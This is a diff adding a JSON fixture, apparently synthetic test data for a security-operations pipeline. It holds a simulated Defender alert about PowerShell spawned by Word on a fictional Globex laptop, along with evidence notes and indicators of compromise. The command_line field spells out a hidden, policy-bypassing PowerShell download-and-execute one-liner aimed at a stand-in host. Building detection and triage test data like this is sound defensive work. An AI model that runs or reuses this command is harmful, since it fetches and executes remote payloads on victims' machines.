@@ -1,0 +1,39 @@
+{
+  "alert_id": "ALRT-2026-0008",
+  "source_tool": "Microsoft Defender",
+  "alert_name": "Suspicious PowerShell Execution",
+  "severity": "high",
+  "category": "Execution",
+  "mitre_techniques": ["T1059.001"],
+  "mitre_technique_names": ["Command and Scripting Interpreter: PowerShell"],
+  "detected_at": "2026-06-10T11:08:55Z",
+  "status": "new",
+  "customer_id": "cust-globex-002",
+  "raw": {
+    "host": "GLBX-LT-0331",
+    "host_ip": "10.40.9.62",
+    "username": "GLOBEX\\rgarcia",
+    "process": "powershell.exe",
+    "parent_process": "winword.exe",
+    "process_id": 7720,
+    "command_line": "powershell.exe -nop -w hidden - exec bypass IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.test/stage1')",
+    "signed": false,
+    "network_connection": "203.0.113.150:80",
+    "amsi_result": "flagged"
+  },
+  "evidence": [
+    "powershell.exe was spawned by winword.exe on GLBX-LT-0331, an atypical parent-child relationship.",
+    "The command line used -nop -w hidden -exec bypass and an IEX DownloadString to fetch remote content from malicious-domain.test.",
+    "An outbound connection to 203.0.113.150:80 was observed immediately after process start.",
+    "AMSI flagged the script content as suspicious."
+  ],
+  "enrichment_hints": {
+    "iocs": {
+      "ips": ["203.0.113.150"],
+      "domains": ["malicious-domain.test"],
+      "hashes": [],
+      "users": ["GLOBEX\\rgarcia"],
+      "hosts": ["GLBX-LT-0331"]
+    }
+  }
+}
